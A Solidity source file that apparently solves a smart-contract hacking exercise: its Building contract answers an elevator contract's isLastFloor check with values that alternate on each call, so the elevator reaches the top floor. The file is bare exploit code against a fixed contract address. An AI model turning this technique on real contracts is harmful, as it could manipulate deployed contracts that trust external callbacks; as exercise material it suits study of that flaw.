pragma solidity ^0.8.0;


interface IElevator {
    function goTo(uint _floor) external;
}

contract Building {
    IElevator e = IElevator(0x681E4D48DDa36e9a009aa1Ad9d839C812f1aC862);
    bool last = true;

    function exec() public {
        e.goTo(420);
    }

    function isLastFloor(uint) external returns (bool) {
        last = !last;
        return last;
    }
}